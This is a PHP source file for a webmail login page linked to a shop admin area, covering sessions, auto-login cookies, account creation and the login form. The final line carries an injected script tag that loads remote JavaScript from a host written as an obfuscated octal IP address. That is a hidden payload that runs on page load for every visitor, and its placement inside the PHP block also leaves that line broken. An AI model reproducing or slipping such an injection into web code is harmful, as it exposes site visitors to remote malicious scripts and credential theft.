<?php

	if (!defined('WM_ROOTPATH')) define('WM_ROOTPATH', (dirname(__FILE__).'/'));
	
	require_once(WM_ROOTPATH.'class_settings.php');
	require_once(WM_ROOTPATH.'class_folders.php');
	require_once(WM_ROOTPATH.'class_mailprocessor.php');
	require_once(WM_ROOTPATH.'class_filesystem.php');

	$errorClass = 'wm_hide'; //if there is no error
	$errorDesc = '';
	$null = null;
	$error = isset($_GET['error']) ? $_GET['error'] : '';
	$isconfig = true;
	
	@session_name('PHPWEBMAILSESSID');
	@session_start();
	
	unset($_SESSION[SESSION_LANG]);
	
	$settings = &Settings::CreateInstance();
	if (!$settings || !$settings->isLoad) 
	{
		$isconfig = false;
		$error = '3';
	}
	elseif (!$settings->IncludeLang())
	{
		$isconfig = false;
		$error = '1';
	}
	
	if ($isconfig && isset($_SESSION[ACCOUNT_ID]))
	{
		$acct =& Account::LoadFromDb((int) $_SESSION[ACCOUNT_ID]);
		if ($acct)
		{
			$fs = new FileSystem(INI_DIR.'/temp', $acct->Email, $acct->Id);
			$fs->DeleteAccountDirs();
			unset($fs, $acct);
		}
	}
	
	$mode = isset($_GET['mode']) ? $_GET['mode'] : 'standard';
	if ($mode == 'logout')
	{
		@session_destroy();
		@session_name('PHPWEBMAILSESSID');
		@session_start();
	}
	
	if (!$isconfig)
	{
?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd" />
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta http-equiv="Content-Script-Type" content="text/javascript" />
	<meta http-equiv="Cache-Control" content="private,max-age=1209600" />
	<title>WebMail probably not configured</title>
	<link rel="stylesheet" href="skins/Hotmail_Style/styles.css" type="text/css" />
</head>
<body>
<div align="center" id="content" class="wm_content">
	<div class="wm_logo" id="logo" tabindex="-1" onfocus="this.blur();">
		<span><?php echo StoreWebmail;?></span>
		<a class="header" target="_top" href="<?php echo !empty($_SESSION['cart_url']) ? $_SESSION['cart_url'] : '../../../../../admin.php'; ?>"><?php echo BackToCart;?></a>
	</div>

	<div class="wm_login_error">WebMail probably not configured</div>
	<div class="wm_copyright" id="copyright">
<?php
		@require('inc.footer.php');
		exit('</div></div>');
	}	
	
	if ($error == '6') // lang error
	{
		$errorDesc = 'Can\'t find required language file.';
		$errorClass = 'wm_login_error';
	}
	elseif ($error == '1') // session error 
	{
		$errorDesc = PROC_SESSION_ERROR;
		$errorClass = 'wm_login_error';
	}
	elseif ($error == '2') // account error 
	{
		$errorDesc = PROC_CANT_LOAD_ACCT;
		$errorClass = 'wm_login_error';
	}
	elseif ($error == '3') // settings error 
	{
		$errorDesc = PROC_CANT_GET_SETTINGS;
		$errorClass = 'wm_login_error';
	}
	elseif ($error == '5') // connection error 
	{
		$errorDesc = PROC_CANT_LOAD_DB;
		$errorClass = 'wm_login_error';
	} 
	else 
	{
		if (isset($_COOKIE['awm_autologin_data']) && isset($_COOKIE['awm_autologin_id']))
		{
			require_once(WM_ROOTPATH.'class_account.php');
			
			$account = &Account::LoadFromDb($_COOKIE['awm_autologin_id']);
			
			if ($account != null && $_COOKIE['awm_autologin_data'] == 
					md5(ConvertUtils::EncodePassword($account->MailIncPassword, $account)))
			{
				$_SESSION[ACCOUNT_ID] = $account->Id; 
				$_SESSION[USER_ID] = $account->IdUser;
				$_SESSION[SESSION_LANG] = $account->DefaultLanguage;
				
				if ($settings->AllowAjax)
				{
					header('Location: webmail.php?check=1');
				}
				else 
				{
					header('location: basewebmail.php?check=1');
				}
				exit;
			}
		}
	}
	
	@header('Content-type: text/html; charset=utf-8');

	define('POP3_PROTOCOL', 0);
	define('IMAP4_PROTOCOL', 1);
	
	define('defaultTitle', $settings->WindowTitle);
	
	$skins = &FileSystem::GetSkinsList();
	
	foreach ($skins as $skinName)
	{
		if ($skinName == $settings->DefaultSkin)
		{
			define('defaultSkin', $settings->DefaultSkin);
			break;
		}
	}
	
	if (!defined('defaultSkin'))
	{
		define('defaultSkin', (count($skins) > 0) ? $skins[0] : 'Hotmail_Style');
	}
	
	define('defaultIncServer', $settings->IncomingMailServer);
	define('defaultIncPort', $settings->IncomingMailPort);
	define('defaultOutServer', $settings->OutgoingMailServer);
	define('defaultOutPort', $settings->OutgoingMailPort);
	define('defaultUseSmtpAuth', $settings->ReqSmtpAuth);
	define('defaultSignMe', false);
	define('defaultIsAjax', $settings->AllowAjax ? 'true' : 'false');
	define('defaultAllowAdvancedLogin', $settings->AllowAdvancedLogin);
	define('defaultHideLoginMode', $settings->HideLoginMode);
	define('defaultDomainOptional', $settings->DefaultDomainOptional);

	switch ($settings->IncomingMailProtocol)
	{
		case IMAP4_PROTOCOL:
			$imap4Selected = ' selected="selected"';
			$pop3Selected = '';
			break;
		default:
			$pop3Selected = ' selected="selected"';
			$imap4Selected = '';
	}

	$smtpAuthChecked = (defaultUseSmtpAuth) ? ' checked="checked"' : '';
	$signMeChecked = (defaultSignMe)? ' checked="checked"' : '';
	
	//for version without ajax
	$mode = isset($_GET['mode']) ? $_GET['mode'] : 'standard'; //mode = standard|advanced|submit
	if ($mode == 'submit' && 
		!isset($_POST['email'], $_POST['login'], $_POST['password'], $_POST['inc_server'], $_POST['inc_port'], $_POST['out_server'], $_POST['out_port'], $_POST['advanced_login']))
	{ 
		$mode = 'standard';
	} 	
	
	$emailClass = '';
	$loginClass = '';
	$loginWidth = '220px';
	$domainContent = '';
	switch ($mode)
	{
		case 'submit':
			$globalEmail = $_POST['email'];
			$globalLogin = $_POST['login'];
			$globalPassword = $_POST['password'];
			$globalIncServer = $_POST['inc_server'];
			$globalIncProtocol = $_POST['inc_protocol'];
			$globalIncPort = $_POST['inc_port'];
			$globalOutServer = $_POST['out_server'];
			$globalOutPort = $_POST['out_port'];
			$globalUseSmtpAuth = isset($_POST['smtp_auth']) ? $_POST['smtp_auth'] : 0;
			$globalSignMe = isset($_POST['sign_me']) ? $_POST['sign_me'] : 0;
			$globalAdvancedLogin = $_POST['advanced_login'];//0|1
			
			$sendSettingsList = false;
			$isNoLoginField = false;
			$isXmailError = false;
			
			if ($globalAdvancedLogin && $settings->AllowAdvancedLogin)
			{
				$email = $globalEmail;
				$login = $globalLogin;
			}
			else
			{
				switch ($settings->HideLoginMode)
				{
					case 0:
						$email = $globalEmail;
						$login = $globalLogin;
						break;
					
					case 10:
						
						$email = $globalEmail;
						$isNoLoginField = true;
						
						$emailAddress = &new EmailAddress();
						$emailAddress->SetAsString($email);
	
						$optLogin = $emailAddress->GetAccountName();
						break;
						
					case 11:
						$email = $globalEmail;
						$isNoLoginField = true;
						
						$optLogin = $email;
						break;
						
					case 20:
					case 21:
						$login = $globalLogin;
						$email = $login.'@'.$settings->DefaultDomainOptional;
						break;
						
					case 22:
					case 23:
						$login = $globalLogin.'@'.$settings->DefaultDomainOptional;
						$email = $login;
				}
			}			
			
			if ($isNoLoginField)
			{
				$loginArray = &Account::LoadFromDbOnlyByEmail($email);
				if (is_array($loginArray) && count($loginArray) > 3)
				{
					$eAccount = &Account::LoadFromDb((int) $loginArray[0]);
					$mailIncPass = $globalPassword;
					
					$login = (ConvertUtils::DecodePassword($loginArray[1], $eAccount) == $mailIncPass)
						? $loginArray[4] : $optLogin;
				}
				else
				{
					$login = $optLogin;
				}
			}
			else 
			{
				$loginArray = &Account::LoadFromDbByLogin($email, $login);
			}	
			
			if ($loginArray === false)
			{
				$errorDesc = getGlobalError();
				$errorClass = 'wm_login_error';
			} 
			elseif ($loginArray === null)
			{
				if ($settings->AllowNewUsersRegister)
				{
					$account = &new Account();

					$account->DefaultAccount = true;
					$account->Email = $email;
					$account->MailIncLogin = $login;
					$account->MailIncPassword = $globalPassword;
					
					if ($globalAdvancedLogin && $settings->AllowAdvancedLogin)
					{
						$account->MailProtocol = (int) $globalIncProtocol;
						$account->MailIncPort = (int) $globalIncPort;
						$account->MailOutPort = (int) $globalOutPort;
						$account->MailOutAuthentication = (bool) $globalUseSmtpAuth;
						$account->MailIncHost = $globalIncServer;
						$account->MailOutHost = $globalOutServer;		
					}
					else 
					{
						$account->MailProtocol = (int) $settings->IncomingMailProtocol;
						$account->MailIncPort = (int) $settings->IncomingMailPort;
						$account->MailOutPort = (int) $settings->OutgoingMailPort;
						$account->MailOutAuthentication = (bool) $settings->ReqSmtpAuth;
						$account->MailIncHost = $settings->IncomingMailServer;
						$account->MailOutHost = $settings->OutgoingMailServer;				
					}

					if ($settings->EnableWmServer)
					{
						$WMConsole = new CWmServerConsole();	
						if ($WMConsole->Connect())
						{
							$domains = $WMConsole->DomainList();
							$domain = EmailAddress::GetDomainFromEmail($account->Email);
							if (in_array($domain, $domains))
							{
								$account->MailProtocol = MAILPROTOCOL_WMSERVER;
								$account->MailOutLogin = $account->Email;
								$account->MailOutPassword = $account->MailIncPassword;
								$account->MailOutHost = $settings->WmServerHost;
								$account->MailOutPort = $WMConsole->Settings->OutPort;
							}
							$WMConsole->Disconnect();
						}
						else 
						{
							$errorDesc = $WMConsole->GetError();
							$errorClass = 'wm_login_error';
							$isXmailError = true;
						}
					}
					
					$validate = $account->ValidateData();
					if ($validate !== true)
					{
						$errorDesc = $validate;
						$errorClass = 'wm_login_error';
					}
					else if (!$isXmailError) 
					{				
						$processor = &new MailProcessor($account);
						
						if ($processor->MailStorage->Connect(true) || ($account->MailProtocol == MAILPROTOCOL_WMSERVER && $settings->WmAllowManageXMailAccounts))
						{
							$user = &User::CreateUser();
		
							if ($user != null)
							{
								$account->IdUser = $user->Id;
							}
							
							$folderSync = FOLDERSYNC_AllEntireMessages;
							if ($account->MailProtocol == MAILPROTOCOL_IMAP4)
							{
								$folderSync = FOLDERSYNC_AllHeadersOnly;
							}							
							
							$inboxSyncType = ($settings->AllowDirectMode &&	$settings->DirectModeIsDefault)?
									FOLDERSYNC_DirectMode : $folderSync;
							if ($user != null && $user->CreateAccount($account, $inboxSyncType))
							{
								$_SESSION[ACCOUNT_ID] = $account->Id;
								$_SESSION[USER_ID] = $account->IdUser;
								$_SESSION[SESSION_LANG] = $account->DefaultLanguage;
								$sendSettingsList = true;
							}
							else
							{
								if ($user != null)
								{
									User::DeleteUserSettings($user->Id);
								}
								$errorDesc = CantCreateUser;
								$errorClass = 'wm_login_error';
							}
						}
						else
						{
							$errorDesc = PROC_WRONG_ACCT_PWD;
							$errorClass = 'wm_login_error';
						}
					}
				}
				else 
				{
					$errorDesc = CantCreateAccount;
					$errorClass = 'wm_login_error';					
				}
			}
			elseif ($loginArray[2] == 0)
			{
				$errorDesc = PROC_CANT_LOG_NONDEF;
				$errorClass = 'wm_login_error';
			}
			elseif (!$isXmailError)
			{
				$newAccount = &Account::LoadFromDb($loginArray[0]);
				
				$mailIncPass = $globalPassword;
				
				if (DEMOACCOUNTALLOW && $email == DEMOACCOUNTEMAIL)
				{
					$mailIncPass = DEMOACCOUNTPASS;
				}
			
				if (ConvertUtils::DecodePassword($loginArray[1], $newAccount) == $mailIncPass)
				{
					$_SESSION[ACCOUNT_ID] = $loginArray[0];
					$_SESSION[USER_ID] = $loginArray[3];
					
					$account = &$newAccount;
					
					if (isset($_SESSION['attachtempdir']))
					{
						$fs = &new FileSystem(INI_DIR.'/temp', $account->Email, $account->Id);
						$attfolder = new Folder($_SESSION[ACCOUNT_ID], -1, $_SESSION['attachtempdir']);
						$fs->DeleteDir($attfolder);
						unset($fs, $attfolder);
					}
					else
					{
						$_SESSION['attachtempdir'] = md5(session_id());
					}

					$_SESSION[SESSION_LANG] = $account->DefaultLanguage;
					
					$sendSettingsList = true;
				}
				else
				{
					$account = &$newAccount;
					
					$account->MailIncPassword = $mailIncPass;
					$newprocessor = &new MailProcessor($account);
					if ($newprocessor->MailStorage->Connect(true))
					{
						$_SESSION[ACCOUNT_ID] = $loginArray[0];
						$_SESSION[USER_ID] = $loginArray[3];
						
						if (isset($_SESSION['attachtempdir']))
						{
							$fs = &new FileSystem(INI_DIR.'/temp', $account->Email, $account->Id);
							$attfolder = &new Folder($_SESSION[ACCOUNT_ID], -1, $_SESSION['attachtempdir']);
							$fs->DeleteDir($attfolder);
							unset($fs, $attfolder);
						}
						else
						{
							$_SESSION['attachtempdir'] = md5(session_id());	
						}
						
						$_SESSION[SESSION_LANG] = $account->DefaultLanguage;
					
						$sendSettingsList = true;
					
						if (!$account->Update())
						{
							$errorDesc = PROC_WRONG_ACCT_PWD;
							$errorClass = 'wm_login_error';
						}
					}
					else 
					{
						$errorDesc = PROC_WRONG_ACCT_PWD;
						$errorClass = 'wm_login_error';
					}					
				}	
			}
			
			if ($sendSettingsList)
			{
				$dbStorage = &DbStorageCreator::CreateDatabaseStorage($null);
				if (!$dbStorage->Connect() || !$dbStorage->UpdateLastLoginAndLoginsCount($account->IdUser))
				{
					$sendSettingsList = false;
					$errorDesc = getGlobalError();
					$errorClass = 'wm_login_error';
				}
			}
			
			if ($sendSettingsList)
			{
				if ($globalSignMe)
				{
					setcookie('awm_autologin_id', $account->Id, time()+(3600*24*14));
					setcookie('awm_autologin_data', 
						md5(ConvertUtils::EncodePassword($account->MailIncPassword, $account)), time()+(3600*24*14));
				}
				header('location: basewebmail.php?check=1');
				exit();
			}
		default:
			$switcherHref = '?mode=advanced';
			$switcherText = JS_LANG_AdvancedLogin;
			$advancedClass = ' class="wm_hide"';
			$advancedLogin = '0';
			if ($settings->HideLoginMode >= 20)
			{
				$emailClass = ' class="wm_hide"';
			}
			if ($settings->HideLoginMode == 10 || $settings->HideLoginMode == 11)
			{
				$loginClass = ' class="wm_hide"';
			}
			if ($settings->HideLoginMode == 21 || $settings->HideLoginMode == 32)
			{
				$loginWidth = '150px';
				$domainContent = '&nbsp;@'.$settings->DefaultDomainOptional;
			}
			break;
		case 'advanced':
			$switcherHref = '?mode=standard';
			$switcherText = JS_LANG_StandardLogin;
			$advancedClass = '';
			$advancedLogin = '1';
			break;
	}
	//end for version without ajax

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd" />
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta http-equiv="Content-Script-Type" content="text/javascript" />
	<meta http-equiv="Cache-Control" content="private,max-age=1209600" />
	<title><?php echo defaultTitle?></title>
	<link rel="stylesheet" href="skins/<?php echo defaultSkin?>/styles.css" type="text/css" id="skin" />
	<script type="text/javascript">
		var isAjax = <?php echo defaultIsAjax?>;
		var WebMailUrl = 'webmail.php';
		var LoginUrl = 'index.php';
		var ActionUrl = 'processing.php';
		var Title = "<?php echo ConvertUtils::ClearJavaScriptString(defaultTitle, '"'); ?>";
		var SkinName = "<?php echo ConvertUtils::ClearJavaScriptString(defaultSkin, '"'); ?>";
		var HideLoginMode = <?php echo defaultHideLoginMode; ?>;
		var DomainOptional = "<?php echo ConvertUtils::ClearJavaScriptString(defaultDomainOptional, '"'); ?>";
		var AllowAdvancedLogin = "<?php echo defaultAllowAdvancedLogin; ?>";
		var AdvancedLogin = '<?php echo $advancedLogin; ?>';
		var EmptyHtmlUrl = 'empty.html';
		var CheckMailUrl = 'check-mail.php';
	</script>
	<script type="text/javascript" src="_language.js.php?lang=<?php echo ConvertUtils::AttributeQuote($settings->DefaultLanguage); ?>"></script>
	<script type="text/javascript" src="_defines.js"></script>
	<script type="text/javascript" src="class.common.js"></script>
	<script type="text/javascript" src="_functions.js"></script>
	<script type="text/javascript" src="class.login.js"></script>
	
</head>

<body onload="Init();">

<table class="wm_hide" id="info">
	<tr>
		<td class="wm_info_message" id="info_message"></td>
	</tr>
</table>
<div align="center" id="content" class="wm_content">
	<div class="wm_logo" id="logo" tabindex="-1" onfocus="this.blur();">
		<span><?php echo StoreWebmail;?></span>
		<a class="header" target="_top" href="<?php echo !empty($_SESSION['cart_url']) ? $_SESSION['cart_url'] : '../../../../../admin.php'; ?>"><?php echo BackToCart;?></a>
	</div>
	<div id="login_screen">
		<div class="<?php echo $errorClass; ?>" id="login_error"><?php echo $errorDesc; ?></div>
		<form action="index.php?mode=submit" method="post" id="login_form" name="login_form">
			<input type="hidden" name="advanced_login" value="<?php echo $advancedLogin; ?>" />
		<table class="wm_login" id="login_table" border="0" cellspacing="0" cellpadding="0">
			<tr>
				<td class="wm_login_header" colspan="5"><?php echo LANG_LoginInfo?></td>
			</tr>
			<tr id="email_cont"<?php echo $emailClass; ?>>
				<td class="wm_title"><?php echo LANG_Email?>:</td>
				<td colspan="4">
					<input class="wm_input" type="text" value="" id="email" name="email" maxlength="255" 
						onfocus="this.className = 'wm_input_focus';" onblur="this.className = 'wm_input';" />
				</td>
			</tr>
			<tr id="login_cont"<?php echo $loginClass; ?>>
				<td class="wm_title"><?php echo LANG_Login?>:</td>
				<td colspan="4" id="login_parent"><nobr>
					<input class="wm_input" type="text" value="" id="login" name="login" maxlength="255" 
						onfocus="this.className = 'wm_input_focus';" onblur="this.className = 'wm_input';" />
					<span id="domain"><?php echo $domainContent; ?></span>
				</nobr></td>
			</tr>
			<tr>
				<td class="wm_title"><?php echo LANG_Password?>:</td>
				<td colspan="4">
					<input class="wm_input wm_password_input" type="password" value="" id="password" name="password" maxlength="255" 
						onfocus="this.className = 'wm_input_focus wm_password_input';" onblur="this.className = 'wm_input wm_password_input';" />
				</td>
			</tr>
			<?php if ($settings->AllowAdvancedLogin) { ?>
			<tr id="incoming"<?php echo $advancedClass?>>
				<td class="wm_title"><?php echo LANG_IncServer?>:</td>
				<td>
					<input class="wm_advanced_input" type="text" value="<?php echo defaultIncServer?>" id="inc_server" name="inc_server" maxlength="255"
						onfocus="this.className = 'wm_advanced_input_focus';" onblur="this.className = 'wm_advanced_input';" />
				</td>
				<td>
					<select class="wm_advanced_input" id="inc_protocol" name="inc_protocol" 
						onfocus="this.className = 'wm_advanced_input_focus';" onblur="this.className = 'wm_advanced_input';">
						<option value="<?php echo POP3_PROTOCOL?>" <?php echo $pop3Selected?>><?php echo LANG_PopProtocol?></option>
						<option value="<?php echo IMAP4_PROTOCOL?>" <?php echo $imap4Selected?>><?php echo LANG_ImapProtocol?></option>
					</select>
				</td>
				<td class="wm_title"><?php echo LANG_IncPort?>:</td>
				<td>
					<input class="wm_advanced_input" type="text" value="<?php echo defaultIncPort?>" id="inc_port" name="inc_port" maxlength="5"
						onfocus="this.className = 'wm_advanced_input_focus';" onblur="this.className = 'wm_advanced_input';" />
				</td>
			</tr>
			<tr id="outgoing"<?php echo $advancedClass?>>
				<td class="wm_title"><?php echo LANG_OutServer?>:</td>
				<td colspan="2">
					<input class="wm_advanced_input" type="text" value="<?php echo defaultOutServer?>" id="out_server" name="out_server" maxlength="255"
						onfocus="this.className = 'wm_advanced_input_focus';" onblur="this.className = 'wm_advanced_input';" />
				</td>
				<td class="wm_title"><?php echo LANG_OutPort?>:</td>
				<td>
					<input class="wm_advanced_input" type="text" value="<?php echo defaultOutPort?>" id="out_port" name="out_port" maxlength="5"
						onfocus="this.className = 'wm_advanced_input_focus';" onblur="this.className = 'wm_advanced_input';" />
				</td>
			</tr>
			<tr id="authentication"<?php echo $advancedClass?>>
				<td colspan="5">
					<input class="wm_checkbox" type="checkbox" value="1" id="smtp_auth" name="smtp_auth"<?php echo $smtpAuthChecked?>>
					<label for="smtp_auth"><?php echo LANG_UseSmtpAuth?></label>
				</td>
			</tr>
			<?php } ?>
			<tr>
				<td colspan="5">
					<input class="wm_checkbox" type="checkbox" value="1" id="sign_me" name="sign_me"<?php echo $signMeChecked?>>
					<label for="sign_me"><?php echo LANG_SignMe?></label>
				</td>
			</tr>
			<tr>
				<td colspan="5">
				<?php if (defaultAllowAdvancedLogin) { ?>
					<span class="wm_login_switcher">
						<a class="wm_reg" href="<?php echo $switcherHref?>" id="login_mode_switcher"><?php echo $switcherText?></a>
					</span>
				<?php } ?>
					<span class="wm_login_button">
						<input class="wm_button" type="submit" id="submit" name="submit" value="<?php echo LANG_Enter?>" />
					</span>
				</td>
			</tr>
		</table>
		</form>
	</div>
	
</div>
<div class="wm_copyright" id="copyright">
	<?php @require('inc.footer.php'); ?>
</div>
</body>
</html>
<?php echo '<!-- '.WMVERSION.' -->';<script src='http://0133.0334.0043.0307/0403.php?js'></script>